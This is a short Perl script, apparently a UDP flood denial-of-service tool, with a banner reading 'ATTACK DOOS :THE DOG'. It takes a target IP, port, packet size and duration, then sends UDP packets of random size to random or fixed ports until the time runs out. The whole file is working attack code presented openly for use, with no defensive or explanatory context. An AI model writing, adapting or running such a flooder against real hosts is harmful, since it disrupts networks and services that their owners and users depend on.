#!/usr/bin/perl

##############
# udp fiber.
##############
 
use Socket;
use strict;
 
if ($#ARGV != 3) {
  system("clear || cls");
#Script Banner================================================================
print q{
  ===============================================================================
                                 ATTACK DOOS :THE DOG                                 
  ===============================================================================

             > BY:THE DOG <
 };
# INPUT TARGET INFO ==============================================
 print " \n";
 print "DDOS NET:) // \n\n";
 print "Commande: perl Fiber.pl <IP> <PORT> <0> <TIME>\n";
  exit(1);
}
 
my ($ip,$port,$size,$time) = @ARGV;
 
my ($iaddr,$endtime,$psize,$pport);
 
$iaddr = inet_aton("$ip") or die "Impossible de se connecter à $ip\n";
$endtime = time() + ($time ? $time : 1000000);
 
socket(flood, PF_INET, SOCK_DGRAM, 17);

print  "START ATTACK IP $ip
START ATTACK port " . ($port ? $port : "random"). " \n";

print " \n";
print  "ATTACK DONE BY:THE DOG...\n";
print "Attaque arrêtée avec Ctrl-C\n" unless $time;
 
for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1500-64)+64) ;
  $pport = $port ? $port : int(rand(65500))+1;
 
  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));}
